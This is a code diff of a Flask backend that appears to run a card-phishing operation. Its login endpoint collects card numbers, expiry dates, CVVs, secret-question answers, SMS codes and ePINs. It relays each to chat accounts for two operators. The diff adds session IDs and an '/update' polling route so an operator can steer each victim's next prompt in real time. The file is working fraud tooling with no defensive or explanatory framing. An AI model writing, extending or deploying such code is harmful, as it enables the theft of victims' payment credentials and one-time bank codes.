@@ -1,12 +1,13 @@
 from flask import Flask, redirect, request, jsonify
 from flask_cors import CORS
-from bot import clicked_button
 from external import send_buttons_message, send_secret_question, send_sms, ne_pizdabol
 from CHAT_ID import MAIN_ID, Egoist
+from checker import get_button_by_id
 app = Flask(__name__)
 CORS(app, resources={r"/*": {"origins": "*"}})
 
 DOMEN = 'http://127.0.0.1:5500'
+
 
 @app.before_request
 def log_request_info():
@@ -28,6 +29,7 @@ def login():
         question = request.args.get('question')
         authCode = request.args.get('authCode')
         epin = request.args.get('epinAuthCode')
+        session = request.args.get('session')
     elif request.method == 'POST':
         print("Received a POST request:")
         print(f"Full URL: {request.url}")
@@ -39,60 +41,43 @@ def login():
         cvv = data.get('cvv')
         id = data.get('id')
         question = data.get('question')
+        session = data.get('session')
+    ID = f'{session}'
 
     # WE
     if id == '1000001':
         if question != None and question != 'None' and authCode == None:
-            send_secret_question(MAIN_ID, card_number, expiry_date, cvv, question)
-            with open('button_state.txt', 'r') as f:
-                clicked_button = f.read().strip()
-            with open('button_state.txt', 'w') as file:
-                file.write('')
-            return f'{clicked_button}'
+            send_secret_question(MAIN_ID, card_number, expiry_date, cvv, question, ID)
+            return ''
         if authCode != None and authCode != 'None':
-            send_sms(MAIN_ID, card_number, expiry_date, cvv, authCode, epin)
-            with open('button_state.txt', 'r') as f:
-                clicked_button = f.read().strip()
-            with open('button_state.txt', 'w') as file:
-                file.write('')
-            return f'{clicked_button}'
-        send_buttons_message(MAIN_ID, card_number, expiry_date, cvv)
+            send_sms(MAIN_ID, card_number, expiry_date, cvv, authCode, epin, ID)
+            return ''
+        send_buttons_message(MAIN_ID, card_number, expiry_date, cvv, ID)
         ne_pizdabol(card_number)
-        with open('button_state.txt', 'r') as f:
-            clicked_button = f.read().strip()
-        with open('button_state.txt', 'w') as file:
-            file.write('')
-        print(clicked_button)
-        return f'{clicked_button}'
+        return ''
     # Egoist
     elif id == '1000002':
         if question != None and question != 'None' and authCode == None:
-            send_secret_question(Egoist, card_number, expiry_date, cvv, question)
-            with open('button_state.txt', 'r') as f:
-                clicked_button = f.read().strip()
-            with open('button_state.txt', 'w') as file:
-                file.write('')
-            return f'{clicked_button}'
+            send_secret_question(Egoist, card_number, expiry_date, cvv, question, ID)
+            return ''
         if authCode != None and authCode != 'None':
-            send_sms(Egoist, card_number, expiry_date, cvv, authCode, epin)
-            with open('button_state.txt', 'r') as f:
-                clicked_button = f.read().strip()
-            with open('button_state.txt', 'w') as file:
-                file.write('')
-            return f'{clicked_button}'
+            send_sms(Egoist, card_number, expiry_date, cvv, authCode, epin, ID)
+            return ''
         ne_pizdabol(card_number)
-        send_buttons_message(Egoist, card_number, expiry_date, cvv)
-        with open('button_state.txt', 'r') as f:
-            clicked_button = f.read().strip()
-        with open('button_state.txt', 'w') as file:
-            file.write('')
-        print(clicked_button)
-        return f'{clicked_button}'
+        send_buttons_message(Egoist, card_number, expiry_date, cvv, ID)
+        return ''
 
 
 @app.route('/test', methods=['GET'])
 def test():
     return jsonify(number=3)
 
+@app.route('/update', methods=['GET'])
+def test2():
+    database = r"database.db"
+    user_id_to_check = request.args.get('session')  
+    result = str(get_button_by_id(user_id_to_check, database))
+    return jsonify({'result': result})
 if __name__ == '__main__':
     app.run(debug=True)
+    
